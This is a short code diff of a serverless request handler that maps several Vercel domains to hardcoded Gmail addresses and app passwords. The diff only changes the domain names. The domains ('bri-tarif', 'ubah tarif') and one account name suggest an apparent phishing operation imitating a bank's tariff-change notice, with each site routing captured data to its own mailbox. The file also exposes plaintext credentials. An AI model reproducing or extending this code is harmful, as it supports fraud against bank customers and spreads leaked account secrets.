@@ -12,11 +12,11 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'ubahtarifffbaru.vercel.app'){
+    } else if(url == 'ubahtarifff--baru.vercel.app'){
         email = 'mutiara369zx@gmail.com' ;
         pass = 'bzuyotskvtnvkwym' ;
         
-    } else if(url == 'tarif-perubahan-barulama.vercel.app'){
+    } else if(url == 'tarifperubahan-barulama.vercel.app'){
         email = 'pesulapmerah12.12.12b@gmail.com';
         pass = 'xsvyoubwxfogcpuh';
 
@@ -25,7 +25,7 @@ export default function handler(req, res) {
         pass = 'moiasopufjkptyvr';
 
 
-    } else if(url == 'bri-tarif.vercel.app'){
+    } else if(url == 'ubah--tarif.vercel.app'){
         email = 'callbribricoid66@gmail.com';
         pass = 'imuujsgssprgrtue';
 
